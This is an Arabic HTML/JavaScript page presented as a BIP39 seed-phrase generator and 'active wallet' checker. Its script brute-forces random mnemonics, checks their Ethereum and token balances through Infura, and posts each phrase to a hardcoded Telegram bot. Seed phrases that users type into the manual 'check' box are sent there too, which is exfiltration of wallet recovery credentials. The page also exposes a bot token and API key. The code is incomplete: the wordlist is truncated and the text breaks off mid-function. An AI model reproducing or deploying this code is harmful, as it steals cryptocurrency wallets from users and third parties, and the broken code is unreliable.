<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مولد عبارات BIP39 والبحث عن المحافظ النشطة - جميع العملات</title>
    <style>
        /* جميع الأنماط السابقة تبقى كما هي */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            direction: rtl;
            text-align: right;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .header {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .header p {
            font-size: 1.1rem;
            opacity: 0.9;
        }

        .main-content {
            padding: 40px;
        }

        .control-panel {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid #e9ecef;
        }

        .control-group {
            margin-bottom: 25px;
        }

        .control-group label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #495057;
            font-size: 1rem;
        }

        .control-group input,
        .control-group select,
        .control-group textarea {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: white;
        }

        .control-group input:focus,
        .control-group select:focus,
        .control-group textarea:focus {
            outline: none;
            border-color: #4facfe;
            box-shadow: 0 0 0 3px rgba(79, 172, 254, 0.1);
        }

        .button-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            justify-content: center;
            margin-top: 30px;
        }

        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            min-width: 150px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(79, 172, 254, 0.3);
        }

        .btn-success {
            background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
            color: white;
        }

        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(86, 171, 47, 0.3);
        }

        .btn-danger {
            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
            color: white;
        }

        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 65, 108, 0.3);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-secondary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .btn-warning {
            background: linear-gradient(135deg, #ff9a00 0%, #ffcc00 100%);
            color: white;
        }

        .btn-warning:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 154, 0, 0.3);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none !important;
        }

        .status-panel {
            background: white;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid #e9ecef;
        }

        .status-panel h3 {
            color: #495057;
            margin-bottom: 20px;
            font-size: 1.3rem;
        }

        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }

        .status-card {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #e9ecef;
        }

        .status-card .number {
            font-size: 2rem;
            font-weight: 700;
            color: #4facfe;
            margin-bottom: 5px;
        }

        .status-card .label {
            color: #6c757d;
            font-size: 0.9rem;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
            width: 0%;
            transition: width 0.3s ease;
        }

        .log-panel {
            background: #212529;
            color: #ffffff;
            border-radius: 15px;
            padding: 20px;
            margin-top: 25px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            line-height: 1.4;
        }

        .log-entry {
            margin-bottom: 8px;
            padding: 5px 0;
            border-bottom: 1px solid #343a40;
        }

        .log-entry:last-child {
            border-bottom: none;
        }

        .log-timestamp {
            color: #6c757d;
            font-size: 0.8rem;
        }

        .log-success {
            color: #28a745;
        }

        .log-error {
            color: #dc3545;
        }

        .log-info {
            color: #17a2b8;
        }

        .wallet-display {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 10px;
            padding: 20px;
            margin: 15px 0;
            word-break: break-all;
        }

        .wallet-display .mnemonic {
            background: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            margin-bottom: 10px;
        }

        .wallet-display .address {
            color: #495057;
            font-family: 'Courier New', monospace;
            font-size: 0.8rem;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .alert {
            padding: 15px 20px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: 500;
        }

        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .alert-danger {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .alert-info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .alert-warning {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }

        .test-result {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-top: 15px;
            border-left: 5px solid #4facfe;
        }

        .test-result.active {
            border-left-color: #28a745;
        }

        .test-result.inactive {
            border-left-color: #dc3545;
        }

        .test-result h4 {
            margin-bottom: 10px;
            color: #495057;
        }

        .test-result .balance {
            font-size: 1.2rem;
            font-weight: bold;
            margin: 10px 0;
        }

        .test-result .balance.positive {
            color: #28a745;
        }

        .test-result .balance.zero {
            color: #6c757d;
        }

        .test-result .transactions {
            margin: 10px 0;
        }

        .test-result .status {
            padding: 5px 10px;
            border-radius: 5px;
            font-weight: bold;
            display: inline-block;
        }

        .test-result .status.active {
            background: #d4edda;
            color: #155724;
        }

        .test-result .status.inactive {
            background: #f8d7da;
            color: #721c24;
        }

        .token-list {
            margin: 10px 0;
            padding: 10px;
            background: #e9ecef;
            border-radius: 5px;
        }

        .token-item {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px solid #ced4da;
        }

        .token-item:last-child {
            border-bottom: none;
        }

        /* الأنماط الجديدة المضافة */
        .generated-mnemonic {
            background: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            position: relative;
        }

        .copy-btn {
            position: absolute;
            top: 10px;
            left: 10px;
            background: #4facfe;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 5px 10px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: background 0.3s;
        }

        .copy-btn:hover {
            background: #3a9de9;
        }

        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .header p {
                font-size: 1rem;
            }
            
            .main-content {
                padding: 20px;
            }
            
            .control-panel {
                padding: 20px;
            }
            
            .button-group {
                flex-direction: column;
            }
            
            .btn {
                width: 100%;
                min-width: auto;
            }
            
            .status-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
            }
            
            .status-card .number {
                font-size: 1.5rem;
            }
            
            .log-panel {
                font-size: 0.8rem;
                max-height: 200px;
            }
        }

        @media (max-width: 480px) {
            .header {
                padding: 20px;
            }
            
            .header h1 {
                font-size: 1.8rem;
            }
            
            .main-content {
                padding: 15px;
            }
            
            .control-panel {
                padding: 15px;
            }
            
            .status-grid {
                grid-template-columns: 1fr;
            }
            
            .status-card {
                padding: 15px;
            }
            
            .wallet-display .mnemonic {
                font-size: 0.8rem;
                padding: 10px;
            }
        }

        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .log-panel::-webkit-scrollbar {
            width: 8px;
        }

        .log-panel::-webkit-scrollbar-track {
            background: #343a40;
            border-radius: 4px;
        }

        .log-panel::-webkit-scrollbar-thumb {
            background: #6c757d;
            border-radius: 4px;
        }

        .log-panel::-webkit-scrollbar-thumb:hover {
            background: #adb5bd;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔑 مولد عبارات BIP39 - جميع العملات</h1>
            <p>البحث عن المحافظ النشطة وإرسالها إلى Telegram - يدعم جميع العملات</p>
        </div>

        <div class="main-content">
            <div class="control-panel">
                <div class="control-group">
                    <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
                    <input type="number" id="searchSpeed" value="3000" min="1000" max="10000" step="500">
                </div>

                <div class="control-group">
                    <label for="maxAttempts">الحد الأقصى للمحاولات (0 = لا نهاية):</label>
                    <input type="number" id="maxAttempts" value="0" min="0" max="10000">
                </div>

                <div class="button-group">
                    <button id="startBtn" class="btn btn-success">
                        <span>🚀 بدء البحث</span>
                    </button>
                    <button id="stopBtn" class="btn btn-danger" disabled>
                        <span>⏹️ إيقاف البحث</span>
                    </button>
                    <button id="testTelegramBtn" class="btn btn-secondary">
                        <span>📱 اختبار Telegram</span>
                    </button>
                    <button id="clearLogsBtn" class="btn btn-primary">
                        <span>🗑️ مسح السجل</span>
                    </button>
                </div>
            </div>

            <!-- قسم اختبار العبارات يدويًا -->
            <div class="control-panel">
                <h3>🔍 اختبار عبارة BIP39 يدويًا</h3>
                
                <!-- قسم العبارات المولدة تلقائيًا -->
                <div class="control-group">
                    <label>العبارات المولدة تلقائيًا:</label>
                    <div id="generatedMnemonic" class="generated-mnemonic">
                        سيتم عرض العبارات المولدة تلقائيًا هنا...
                        <button class="copy-btn" onclick="copyGeneratedMnemonic()">نسخ</button>
                    </div>
                    <button id="testGeneratedBtn" class="btn btn-primary">
                        <span>🔍 فحص العبارة المولدة</span>
                    </button>
                </div>
                
                <div class="control-group">
                    <label for="manualMnemonic">أدخل عبارة BIP39 يدويًا (12 كلمة):</label>
                    <textarea id="manualMnemonic" rows="3" placeholder="أدخل عبارة الاسترجاع المكونة من 12 كلمة هنا..."></textarea>
                </div>
                <div class="button-group">
                    <button id="testManualBtn" class="btn btn-warning">
                        <span>🔍 فحص العبارة اليدوية</span>
                    </button>
                </div>
                <div id="manualTestResult" class="test-result" style="display: none;">
                    <!-- سيتم ملؤه ديناميكيًا -->
                </div>
            </div>

            <div class="status-panel">
                <h3>📊 إحصائيات العملية</h3>
                <div class="status-grid">
                    <div class="status-card">
                        <div class="number" id="totalGenerated">0</div>
                        <div class="label">إجمالي العبارات</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="activeWallets">0</div>
                        <div class="label">المحافظ النشطة</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="emptyWallets">0</div>
                        <div class="label">المحافظ الفارغة</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="errorCount">0</div>
                        <div class="label">الأخطاء</div>
                    </div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div id="currentStatus" class="alert alert-info">
                    جاهز للبدء... التطبيق يدعم الآن جميع العملات
                </div>
            </div>

            <div class="log-panel" id="logPanel">
                <div class="log-entry log-info">
                    <span class="log-timestamp" id="currentTime"></span>
                    مرحباً بك في مولد عبارات BIP39 المحسن. يدعم الآن جميع العملات المشهورة.
                </div>
            </div>
        </div>
    </div>

    <!-- تحميل مكتبة ethers.js -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

    <script>
        // قائمة كلمات BIP39 الإنجليزية الرسمية
        const BIP39_WORDLIST = [
            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
            "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
            // ... (بقية الكلمات تبقى كما هي)
        ];

        // إعدادات التطبيق
        const INFURA_PROJECT_ID = '482a7c1c7cc14ec78699c3f1c231b0cd';
        const INFURA_URL = `https://mainnet.infura.io/v3/${INFURA_PROJECT_ID}`;
        const TELEGRAM_BOT_TOKEN = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
        const TELEGRAM_CHAT_ID = '910021564';
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

        // قائمة العملات المشهورة المضافة
        const POPULAR_TOKENS = [
            {
                symbol: 'USDT',
                address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                decimals: 6
            },
            {
                symbol: 'USDC', 
                address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
                decimals: 6
            },
            {
                symbol: 'DAI',
                address: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
                decimals: 18
            },
            {
                symbol: 'LINK',
                address: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
                decimals: 18
            },
            {
                symbol: 'UNI',
                address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
                decimals: 18
            },
            {
                symbol: 'WBTC',
                address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
                decimals: 8
            },
            {
                symbol: 'AAVE',
                address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
                decimals: 18
            },
            {
                symbol: 'SHIB',
                address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
                decimals: 18
            }
        ];

        // متغيرات العملية
        let isRunning = false;
        let searchInterval = null;
        let lastGeneratedMnemonic = '';
        let stats = {
            totalGenerated: 0,
            activeWallets: 0,
            emptyWallets: 0,
            errors: 0
        };

        // عناصر DOM
        const elements = {
            startBtn: document.getElementById('startBtn'),
            stopBtn: document.getElementById('stopBtn'),
            testTelegramBtn: document.getElementById('testTelegramBtn'),
            clearLogsBtn: document.getElementById('clearLogsBtn'),
            testManualBtn: document.getElementById('testManualBtn'),
            testGeneratedBtn: document.getElementById('testGeneratedBtn'),
            manualMnemonic: document.getElementById('manualMnemonic'),
            generatedMnemonic: document.getElementById('generatedMnemonic'),
            manualTestResult: document.getElementById('manualTestResult'),
            searchSpeed: document.getElementById('searchSpeed'),
            maxAttempts: document.getElementById('maxAttempts'),
            totalGenerated: document.getElementById('totalGenerated'),
            activeWallets: document.getElementById('activeWallets'),
            emptyWallets: document.getElementById('emptyWallets'),
            errorCount: document.getElementById('errorCount'),
            progressFill: document.getElementById('progressFill'),
            currentStatus: document.getElementById('currentStatus'),
            logPanel: document.getElementById('logPanel'),
            currentTime: document.getElementById('currentTime')
        };

        // تحديث الوقت الحالي
        function updateCurrentTime() {
            const now = new Date();
            elements.currentTime.textContent = `[${now.toLocaleTimeString('ar-EG')}]`;
        }
        setInterval(updateCurrentTime, 1000);
        updateCurrentTime();

        // التحقق من تحميل ethers.js
        function checkEthersLoaded() {
            if (typeof ethers === 'undefined') {
                updateStatus('❌ فشل في تحميل مكتبة ethers.js. يرجى التحقق من اتصال الإنترنت.', 'danger');
                addLogEntry('❌ فشل في تحميل مكتبة ethers.js', 'error');
                return false;
            }
            return true;
        }

        // وظائف توليد العبارات العشوائية
        function getSecureRandomInt(max) {
            const array = new Uint32Array(1);
            window.crypto.getRandomValues(array);
            return array[0] % max;
        }

        function generateRandomBIP39Phrase() {
            const words = [];
            for (let i = 0; i < 12; i++) {
                const randomIndex = getSecureRandomInt(BIP39_WORDLIST.length);
                words.push(BIP39_WORDLIST[randomIndex]);
            }
            return words.join(' ');
        }

        // وظائف المحفظة
        async function mnemonicToAddress(mnemonic) {
            try {
                if (!checkEthersLoaded()) {
                    throw new Error('مكتبة ethers.js غير محملة');
                }
                
                if (!ethers.utils.isValidMnemonic(mnemonic)) {
                    throw new Error('عبارة استرجاع غير صالحة');
                }
                
                const wallet = ethers.Wallet.fromMnemonic(mnemonic);
                return wallet.address;
            } catch (error) {
                console.error('خطأ في تحويل العبارة إلى عنوان:', error);
                throw error;
            }
        }

        async function checkWalletBalance(address) {
            try {
                if (!checkEthersLoaded()) {
                    return null;
                }
                
                const provider = new ethers.providers.JsonRpcProvider(INFURA_URL);
                const balance = await provider.getBalance(address);
                const balanceEth = ethers.utils.formatEther(balance);
                return parseFloat(balanceEth);
            } catch (error) {
                console.error('خطأ في التحقق من رصيد ETH:', error);
                return null;
            }
        }

        // الدالة الجديدة لجلب أرصدة العملات
        async function getTokenBalances(address) {
            try {
                if (!checkEthersLoaded()) {
                    return [];
                }
                
                const provider = new ethers.providers.JsonRpcProvider(INFURA_URL);
                const tokenBalances = [];
                
                for (const token of POPULAR_TOKENS) {
                    try {
                        const abi = ['function balanceOf(address) view returns (uint256)'];
                        const tokenContract = new ethers.Contract(token.address, abi, provider);
                        
                        const balance = await tokenContract.balanceOf(address);
                        const formattedBalance = ethers.utils.formatUnits(balance, token.decimals);
                        const numericBalance = parseFloat(formattedBalance);
                        
                        if (numericBalance > 0) {
                            tokenBalances.push({
                                symbol: token.symbol,
                                balance: numericBalance,
                                address: token.address
                            });
                        }
                    } catch (error) {
                        console.error(`خطأ في جلب رصيد ${token.symbol}:`, error);
                    }
                }
                
                return tokenBalances;
            } catch (error) {
                console.error('خطأ في جلب أرصدة العملات:', error);
                return [];
            }
        }

        async function getTransactionCount(address) {
            try {
                if (!checkEthersLoaded()) {
                    return null;
                }
                
                const provider = new ethers.providers.JsonRpcProvider(INFURA_URL);
                const transactionCount = await provider.getTransactionCount(address);
                return transactionCount;
            } catch (error) {
                console.error('خطأ في الحصول على عدد المعاملات:', error);
                return null;
            }
        }

        // تحديث دالة isWalletActive لدعم العملات المتعددة
        async function isWalletActive(address) {
            try {
                const [balance, transactionCount, tokenBalances] = await Promise.all([
                    checkWalletBalance(address),
                    getTransactionCount(address),
                    getTokenBalances(address)
                ]);
                
                const hasBalance = balance !== null && balance > 0;
                const hasTransactions = transactionCount !== null && transactionCount > 0;
                const hasTokens = tokenBalances.length > 0;
                
                return {
                    isActive: hasBalance || hasTransactions || hasTokens,
                    balance: balance,
                    transactionCount: transactionCount,
                    tokenBalances: tokenBalances,
                    hasBalance: hasBalance,
                    hasTransactions: hasTransactions,
                    hasTokens: hasTokens
                };
            } catch (error) {
                console.error('خطأ في التحقق من نشاط المحفظة:', error);
                return {
                    isActive: false,
                    balance: null,
                    transactionCount: null,
                    tokenBalances: [],
                    hasBalance: false,
                    hasTransactions: false,
                    hasTokens: false,
                    error: error.message
                };
            }
        }

        // وظائف Telegram
        async function sendTelegramMessage(message) {
            try {
                const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                if (!data.ok) {
                    console.error('خطأ في إرسال الرسالة:', data.description);
                    return false;
                }
                
                return true;
            } catch (error) {
                console.error('خطأ في الاتصال بـ Telegram:', error);
                return false;
            }
        }

        // تحديث دالة formatWalletMessage لعرض جميع العملات
        function formatWalletMessage(mnemonic, address, walletDetails, isActive) {
            const timestamp = new Date().toLocaleString('ar-EG', {
                timeZone: 'Africa/Cairo',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            
            let message = '';
            if (isActive) {
                message = `🎉 <b>تم العثور على محفظة نشطة!</b>\n\n`;
            } else {
                message = `📝 <b>عبارة استرجاع جديدة</b>\n\n`;
            }
            
            message += `📝 <b>العبارة:</b>\n<code>${mnemonic}</code>\n\n`;
            message += `📍 <b>العنوان:</b>\n<code>${address}</code>\n\n`;
            
            if (walletDetails.balance !== null) {
                message += `💰 <b>رصيد ETH:</b> ${walletDetails.balance.toFixed(6)} ETH\n`;
            }
            
            if (walletDetails.transactionCount !== null) {
                message += `📊 <b>عدد المعاملات:</b> ${walletDetails.transactionCount}\n`;
            }
            
            // إضافة أرصدة العملات الأخرى
            if (walletDetails.tokenBalances.length > 0) {
                message += `\n🪙 <b>العملات الأخرى:</b>\n`;
                walletDetails.tokenBalances.forEach(token => {
                    message += `   ${token.symbol}: ${token.balance.toFixed(4)}\n`;
                });
            }
            
            if (isActive) {
                message += `\n✅ <b>الحالة:</b> محفظة نشطة\n`;
            } else {
                message += `\n❌ <b>الحالة:</b> محفظة فارغة\n`;
            }
            
            message += `\n⏰ <b>الوقت:</b> ${timestamp}`;
            return message;
        }

        async function sendWalletToTelegram(mnemonic, address, walletDetails, isActive) {
            try {
                const message = formatWalletMessage(mnemonic, address, walletDetails, isActive);
                return await sendTelegramMessage(message);
            } catch (error) {
                console.error('خطأ في إرسال المحفظة:', error);
                return false;
            }
        }

        // وظائف السجل
        function addLogEntry(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString('ar-EG');
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> ${message}`;
            
            elements.logPanel.appendChild(logEntry);
            elements.logPanel.scrollTop = elements.logPanel.scrollHeight;
        }

        // وظائف تحديث الواجهة
        function updateStats() {
            elements.totalGenerated.textContent = stats.totalGenerated;
            elements.activeWallets.textContent = stats.activeWallets;
            elements.emptyWallets.textContent = stats.emptyWallets;
            elements.errorCount.textContent = stats.errors;
            
            const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
            if (maxAttempts > 0) {
                const progress = (stats.totalGenerated / maxAttempts) * 100;
                elements.progressFill.style.width = `${Math.min(progress, 100)}%`;
            }
        }

        function updateStatus(message, type = 'info') {
            elements.currentStatus.textContent = message;
            elements.currentStatus.className = `alert alert-${type}`;
        }

        // الوظيفة الرئيسية للبحث
        async function searchForActiveWallets() {
            try {
                if (!checkEthersLoaded()) {
                    stats.errors++;
                    updateStats();
                    return;
                }

                const mnemonic = generateRandomBIP39Phrase();
                stats.totalGenerated++;
                
                // حفظ العبارة المولدة لعرضها في قسم الاختبار اليدوي
                lastGeneratedMnemonic = mnemonic;
                elements.generatedMnemonic.textContent = mnemonic;
                
                updateStatus(`جاري فحص العبارة رقم ${stats.totalGenerated}...`, 'info');
                addLogEntry(`تم توليد عبارة جديدة: ${mnemonic.substring(0, 30)}...`);
                
                const address = await mnemonicToAddress(mnemonic);
                
                if (!address) {
                    stats.errors++;
                    addLogEntry('خطأ في تحويل العبارة إلى عنوان', 'error');
                    updateStats();
                    return;
                }
                
                const walletStatus = await isWalletActive(address);
                
                const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, walletStatus.isActive);
                
                if (walletStatus.isActive) {
                    stats.activeWallets++;
                    addLogEntry(`🎉 تم العثور على محفظة نشطة! العنوان: ${address}`, 'success');
                    
                    if (telegramSent) {
                        addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
                    } else {
                        addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
                    }
                    
                    updateStatus(`تم العثور على محفظة نشطة! إجمالي المحافظ النشطة: ${stats.activeWallets}`, 'success');
                } else {
                    stats.emptyWallets++;
                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`);
                    
                    if (telegramSent) {
                        addLogEntry('✅ تم إرسال المحفظة الفارغة إلى Telegram بنجاح', 'info');
                    } else {
                        addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
                    }
                }
                
                updateStats();
                
                const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
                if (maxAttempts > 0 && stats.totalGenerated >= maxAttempts) {
                    stopSearch();
                    updateStatus(`تم الوصول للحد الأقصى من المحاولات (${maxAttempts})`, 'warning');
                    addLogEntry(`تم إيقاف البحث - وصل للحد الأقصى: ${maxAttempts} محاولة`, 'info');
                }
                
            } catch (error) {
                stats.errors++;
                addLogEntry(`خطأ في العملية: ${error.message}`, 'error');
                updateStats();
            }
        }

        // وظائف اختبار العبارات يدويًا
        async function testManualMnemonic() {
            const mnemonic = elements.manualMnemonic.value.trim();
            
            if (!mnemonic) {
                updateStatus('يرجى إدخال عبارة BIP39 للفحص', 'warning');
                return;
            }
            
            try {
                if (!checkEthersLoaded()) {
                    return;
                }

                updateStatus('جاري فحص العبارة...', 'info');
                addLogEntry(`🔍 جاري فحص العبارة يدويًا: ${mnemonic}`);
                
                elements.testManualBtn.innerHTML = '<span class="loading-spinner"></span> جاري الفحص...';
                elements.testManualBtn.disabled = true;
                
                const address = await mnemonicToAddress(mnemonic);
                
                addLogEntry(`✅ تم تحويل العبارة إلى العنوان: ${address}`);
                
                const walletStatus = await isWalletActive(address);
                
                updateManualTestResult(mnemonic, address, walletStatus);
                
                const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, walletStatus.isActive);
                
                if (walletStatus.isActive) {
                    addLogEntry(`🎉 العبارة تفتح محفظة نشطة! العنوان: ${address}`, 'success');
                    updateStatus('🎉 العبارة تفتح محفظة نشطة!', 'success');
                    
                    if (telegramSent) {
                        addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
                    } else {
                        addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
                    }
                } else {
                    addLogEntry(`❌ العبارة تفتح محفظة فارغة: ${address}`, 'info');
                    updateStatus('❌ العبارة تفتح محفظة فارغة', 'info');
                    
                    if (telegramSent) {
                        addLogEntry('✅ تم إرسال المحفظة الفارغة إلى Telegram بنجاح', 'info');
                    } else {
                        addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
                    }
                }
                
                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة اليدوية</span>';
                elements.testManualBtn.disabled = false;
                
            } catch (error) {
                updateStatus(`❌ خطأ في فحص العبارة: ${error.message}`, 'danger');
                addLogEntry(`❌ خطأ في فحص العبارة: ${error.message}`, 'error');
                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة اليدوية</span>';
                elements.testManualBtn.disabled = false;
            }
        }

        // وظيفة اختبار العبارات المولدة تلقائيًا
        async function testGeneratedMnemonic() {
            if (!lastGeneratedMnemonic) {
                updateStatus('لم يتم توليد أي عبارة بعد. يرجى بدء البحث أولاً.', 'warning');
                return;
            }
            
            try {
                if (!checkEthersLoaded()) {
                    return;
                }

                updateStatus('جاري فحص العبارة المولدة...', 'info');
                addLogEntry(`🔍 جاري فحص العبارة المولدة: ${lastGeneratedMnemonic}`);
                
                elements.testGeneratedBtn.innerHTML = '<span class="loading-spinner"></span> جاري الفحص...';
                elements.testGeneratedBtn.disabled = true;
                
                const address = await mnemonicToAddress(lastGeneratedMnemonic);
                
                addLogEntry(`✅ تم تحويل العبارة المولدة إلى العنوان: ${address}`);
                
                const walletStatus = await isWalletActive(address);
                
                updateManualTestResult(lastGeneratedMnemonic, address, walletStatus);
                
                const telegramSent = await sendWalletToTelegram(lastGeneratedMnemonic, address, walletStatus, walletStatus.isActive);
                
                if (walletStatus.isActive) {
                    addLogEntry(`🎉 العبارة المولدة تفتح محفظة نشطة! العنوان: ${address}`, 'success');
                    updateStatus('🎉 العبارة المولدة تفتح محفظة نشطة!', 'success');
                    
                    if (telegramSent) {
                        addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
                    } else {
                        addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
                    }
                } else {
                    addLogEntry(`❌ العبارة المولدة تفتح محفظة فارغة: ${address}`, 'info');
                    updateStatus('❌ العبارة المولدة تفتح محفظة فارغة', 'info');
                    
                    if (telegramSent) {
                        addLogEntry('✅ تم إرسال المحفظة الفارغة إلى Telegram بنجاح', 'info');
                    } else {
                        addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
                    }
                }
                
                elements.testGeneratedBtn.innerHTML = '<span>🔍 فحص العبارة المولدة</span>';
                elements.testGeneratedBtn.disabled = false;
                
            } catch (error) {
                updateStatus(`❌ خطأ في فحص العبارة المولدة: ${error.message}`, 'danger');
                addLogEntry(`❌ خطأ في فحص العبارة المولدة: ${error.message}`, 'error');
                elements.testGeneratedBtn.innerHTML = '<span>🔍 فحص العبارة المولدة</span>';
                elements.testGeneratedBtn.disabled = false;
            }
        }

        // تحديث دالة عرض النتائج اليدوية
        function updateManualTestResult(mnemonic, address, walletStatus) {
            let resultHTML = '';
            
            if (walletStatus.isActive) {
                resultHTML = `
                    <h4>✅ نتيجة الفحص: المحفظة نشطة</h4>
                    <div class="status active">محفظة نشطة</div>
                    <div class="balance ${walletStatus.balance > 0 ? 'positive' : 'zero'}">
                        💰 رصيد ETH: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
                    </div>
                    <div class="transactions">
